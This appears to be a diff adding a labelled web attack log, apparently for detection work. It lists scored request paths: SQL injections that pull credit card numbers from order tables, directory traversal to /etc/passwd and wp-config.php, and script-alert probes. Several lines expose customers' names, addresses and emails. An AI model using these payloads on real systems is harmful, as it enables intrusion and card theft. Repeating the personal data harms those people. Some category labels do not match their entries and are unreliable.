+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT binary(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!"))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT("!~!",/**/vErSiOn(),"!~!")) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 0,1)))--
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 3,1)))--
+attack:7  /corporate_info.php?content=corp_mgt" and "x"="y
+attack:7  /corporate_info.php?content=corp_mgt" and "x"="x
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Velma&sln=Charles&sa1=503 FONTELIEU DRIVE&sa2=&sc=New Iberia&ss=LA&sz=70560&se=vmarie2524@yahoo.com&models=5387,3592,&t==QVRDWERMWmVUeGVFVmxwTVQwa"\x01"U2RrRS8yWkZ6TEU=
+============================================
+dos Attack: Denial Of Service 
+
+============================================
+dt Attack: Directory Traversal 
+
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts 
+attack:5  /home/
+attack:5  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!")))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /nut/home/index
+attack:5  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT aes_decrypt(aes_encrypt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!"),1),1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+attack:5  /campaign/home/privacy
+attack:5  /Error/NotFound?../../../../../../../../../..//etc/passwd 
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../..//etc/passwd 
+attack:5  /Error/NotFound?../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts
+attack:5  /usr/license.php
+attack:5  /express/defaultr.aspx?partnerId=REDACTEDP00001&sfn=Jo./Nate&sln=Simmons&sa1=1604 east Aberdeen&sa2=&sc=Muskogee&ss=OK&sz=74401&se=tillygreen682@yahoo.com&models=11TC,
+attack:5  /tmp/
+attack:5  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cAsT(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") as char)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /bin/view/
+attack:5  /Campaign/Account/Register?ReturnUrl=/campaign/home/index
+attack:5  /campaign/home/switchview?mobile=false&amp;returnurl=/campaign/
+attack:5  /exchweb/bin/auth/owalogin.asp
+attack:5  /campaign/home/code
+attack:5  /Error/NotFound?../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts 
+attack:5  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnVeRt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") using utf8)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Nut/home/Code
+attack:5  /system/
+attack:5  /Campaign/Error/NotFound?aspxerrorpath=/campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:5  /Campaign/Account/Register?ReturnUrl=/Campaign/home/Index
+attack:5  /campaign/home/index
+attack:5  /twiki/bin/view/
+attack:5  /root/
+attack:5  /campaign/home/find
+attack:5  /rebates/details.php?partnerid=blbrb00001/system/fckeditor/editor/
+attack:5  /nut/home/detail/2073
+attack:5  /etc/
+attack:5  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT uncompress(compress(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!")))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Campaign/home/Index
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Jo./Nate&sln=Simmons&sa1=1604 east Aberdeen&sa2=&sc=Muskogee&ss=OK&sz=74401&se=tillygreen682@yahoo.com&models=11TC,&t==VnZ6YUplR2VsYWNrNmpHU2laZEhCdGhybWEvOC8vSjc=
+attack:5  /WEB-INF./web.xml
+attack:5  /campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts
+attack:5  /usr/
+attack:5  /campaign/home/contact
+attack:5  /WINDOWS/system32/drivers/etc/hosts
+attack:5  /Error/NotFound?././././././././././/etc/passwd
+attack:5  /sys/
+attack:5  /exchweb/bin/auth/owalogon.asp
+attack:5  /conf/
+attack:5  /exchweb/bin/auth/
+attack:5  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnVeRt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") using latin1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /nut/home/campaignexpired
+attack:5  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT binary(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!"))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /campaign/home/terms
+attack:5  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT("!~!",/**/vErSiOn(),"!~!")) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Error/NotFound?../../../../../../../../../..//etc/passwd
+attack:5  /Error/NotFound?././././././././././WINDOWS\system32\drivers\etc\hosts
+attack:5  /bin/
+attack:5  /Error/NotFound?aspxerrorpath=././././././././././/etc/passwd
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../..//etc/passwd
+attack:5  /windows/
+attack:5  /dev/
+attack:5  /Error/NotFound?aspxerrorpath=././././././././././WINDOWS\system32\drivers\etc\hosts
+attack:5  /boot/
+attack:5  /etc/passwd
+============================================
+spam Attack: Spam 
+
+============================================
+lfi Attack: Local File Inclusion 
+
+attack:6  /change_payment_card.php?order_id=51465722 and(select 1 from(select count(*),concat((select (select concat(payment_cards_id,"|",customers_id,"|",cc_type,"|",cc_number_display,"|",cc_expires,"|",address_book_id)) from bdgweb_oscsmartsubinnodb.payment_cards order by payment_cards_id desc limit 0,1),floor(rand(0)*2))x from bdgweb_oscsmartsubinnodb.payment_cards group by x)a) and 1=1--
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts 
+attack:5  /home/
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!")))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /nut/home/index
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT aes_decrypt(aes_encrypt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!"),1),1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+attack:5  /campaign/home/privacy
+attack:5  /Error/NotFound?../../../../../../../../../..//etc/passwd 
+attack:6  /Express/default.aspx?partnerId=INBOXDOLLARSSTSP00007&partnerOrderId=ibd2087918"\u0013!8)\""&t=ichN4K37hPTLG8EJgadYOmAK6b7JseHN
+attack:6  /express/defaultr.aspx?partnerId=INBOXDOLLARSSTSP00007&partnerOrderId=ibd2087918"\u0013!8)\""
+attack:7  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where customers_id = 18400099 LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../..//etc/passwd 
+attack:5  /Error/NotFound?../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts
+attack:6  /modules/Submit/index.php?op=pre&title=<script>alert("test");</script>
+attack:5  /usr/license.php
+attack:5  /express/defaultr.aspx?partnerId=REDACTEDP00001&sfn=Jo./Nate&sln=Simmons&sa1=1604 east Aberdeen&sa2=&sc=Muskogee&ss=OK&sz=74401&se=tillygreen682@yahoo.com&models=11TC,
+attack:5  /tmp/
+attack:7  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where payment_cards_id = 0 LIMIT 964175,1)))--
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cAsT(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") as char)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /bin/view/
+attack:6  /calendar.php?year=2011&month="<script>alert("Trustkeeper")</script>&day=01
+attack:5  /Campaign/Account/Register?ReturnUrl=/campaign/home/index
+attack:5  /campaign/home/switchview?mobile=false&amp;returnurl=/campaign/
+attack:5  /exchweb/bin/auth/owalogin.asp
+attack:5  /campaign/home/code
+attack:5  /Error/NotFound?../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts 
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders where LIMIT 7,1)))--
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnVeRt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") using utf8)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Nut/home/Code
+attack:5  /system/
+attack:5  /Campaign/Error/NotFound?aspxerrorpath=/campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:5  /Campaign/Account/Register?ReturnUrl=/Campaign/home/Index
+attack:5  /campaign/home/index
+attack:5  /twiki/bin/view/
+attack:5  /root/
+attack:5  /campaign/home/find
+attack:5  /rebates/details.php?partnerid=blbrb00001/system/fckeditor/editor/
+attack:5  /nut/home/detail/2073
+attack:5  /etc/
+attack:6  /Express/default.aspx?partnerId=REDACTEDSTSP00001&sfn=Sharon&sln=Gottschalk&sa1=South 926 U.S. Hwy 41&sa2=&sc=Stephenson&ss=MI&sz=49887&se=sgottschalk75@hotmail.com&t==a1NodFJlejllQXdZcitjV"^"HZDTllIVm04QTJneDQ=
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT uncompress(compress(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!")))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Campaign/home/Index
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Jo./Nate&sln=Simmons&sa1=1604 east Aberdeen&sa2=&sc=Muskogee&ss=OK&sz=74401&se=tillygreen682@yahoo.com&models=11TC,&t==VnZ6YUplR2VsYWNrNmpHU2laZEhCdGhybWEvOC8vSjc=
+attack:5  /WEB-INF./web.xml
+attack:5  /campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:7  /corporate_info.php?content=corp_mgt" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- "x"="x
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts
+attack:5  /usr/
+attack:5  /campaign/home/contact
+attack:5  /WINDOWS/system32/drivers/etc/hosts
+attack:5  /Error/NotFound?././././././././././/etc/passwd
+attack:5  /sys/
+attack:5  /exchweb/bin/auth/owalogon.asp
+attack:5  /conf/
+attack:5  /exchweb/bin/auth/
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnVeRt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") using latin1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /nut/home/campaignexpired
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT binary(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!"))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /campaign/home/terms
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT("!~!",/**/vErSiOn(),"!~!")) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Error/NotFound?../../../../../../../../../..//etc/passwd
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 0,1)))--
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 3,1)))--
+attack:5  /Error/NotFound?././././././././././WINDOWS\system32\drivers\etc\hosts
+attack:5  /bin/
+attack:5  /Error/NotFound?aspxerrorpath=././././././././././/etc/passwd
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../..//etc/passwd
+attack:5  /windows/
+attack:7  /corporate_info.php?content=corp_mgt" and "x"="y
+attack:7  /corporate_info.php?content=corp_mgt" and "x"="x
+attack:5  /dev/
+attack:5  /Error/NotFound?aspxerrorpath=././././././././././WINDOWS\system32\drivers\etc\hosts
+attack:5  /boot/
+attack:5  /etc/passwd
+============================================
+id Attack: Information Disclosure 
+
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002D')</script>
+attack:6  /change_payment_card.php?order_id=51465722 and(select 1 from(select count(*),concat((select (select concat(payment_cards_id,"|",customers_id,"|",cc_type,"|",cc_number_display,"|",cc_expires,"|",address_book_id)) from bdgweb_oscsmartsubinnodb.payment_cards order by payment_cards_id desc limit 0,1),floor(rand(0)*2))x from bdgweb_oscsmartsubinnodb.payment_cards group by x)a) and 1=1--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000046')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000090')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000025')</script>
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=KIMBERLY&sln=HIX&sa1=822 NELSON KILE ROAD&sa2=&sc=DALTON&ss=GA&sz=30721&se=hix@windstream.net&models=3592,&t==VGMyMFV2ME83YkdFVmxwTVQwa"\x01"WDVJK0xieThIQ2U=
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts 
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000013')</script>
+attack:5  /home/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000089')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D2')</script>
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000117')</script>
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!")))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008B')</script>
+attack:5  /nut/home/index
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004C')</script>
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000085')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000033')</script>
+attack:5  /include/editor/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000075')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001D')</script>
+attack:5  /Scripts/customjsbundle?<script>alert('TK00000122')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000024')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006D')</script>
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT aes_decrypt(aes_encrypt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!"),1),1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000084')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000032')</script>
+attack:5  /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000079')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000044')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000082')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000069')</script>
+attack:5  /Error/NotFound?<script>alert('TK00000005')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E0')</script>
+attack:5  /campaign/home/privacy
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000014')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK00000120')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000094')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000126')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000098')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000021')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000048')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007E')</script>
+attack:5  /Error/NotFound?../../../../../../../../../..//etc/passwd 
+attack:5  /<script>alert('TK00000002')</script>
+attack:6  /Express/default.aspx?partnerId=INBOXDOLLARSSTSP00007&partnerOrderId=ibd2087918"\u0013!8)\""&t=ichN4K37hPTLG8EJgadYOmAK6b7JseHN
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007D')</script>
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=emily&sln=masters&sa1=484 hospital hill road&sa2=&sc=mountain city&ss=TN&sz=37683&se=emastersavon@yahoo.com&models=9826,&t==VGMyMFV2ME83YkhNZWR4b"\x06"OVRRK2locW5iSDRyNUI=
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000053')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DE')</script>
+attack:6  /express/defaultr.aspx?partnerId=INBOXDOLLARSSTSP00007&partnerOrderId=ibd2087918"\u0013!8)\""
+attack:7  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where customers_id = 18400099 LIMIT 7,1)))--
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000108')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000076')</script>
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../..//etc/passwd 
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003E')</script>
+attack:5  /Error/NotFound?../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts
+attack:6  /modules/Submit/index.php?op=pre&title=<script>alert("test");</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000020')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000017')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C7')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006E')</script>
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000116')</script>
+attack:5  /lib/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C5')</script>
+attack:5  /usr/license.php
+attack:5  /express/defaultr.aspx?partnerId=REDACTEDP00001&sfn=Jo./Nate&sln=Simmons&sa1=1604 east Aberdeen&sa2=&sc=Muskogee&ss=OK&sz=74401&se=tillygreen682@yahoo.com&models=11TC,
+attack:5  /Home/Index?<script>alert('TK00000129')</script>
+attack:5  /tmp/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002C')</script>
+attack:5  /Scripts/modernizrbundle?<script>alert('TK0000011A')</script>
+attack:7  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where payment_cards_id = 0 LIMIT 964175,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000100')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FE')</script>
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cAsT(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") as char)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /bin/view/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000018')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000043')</script>
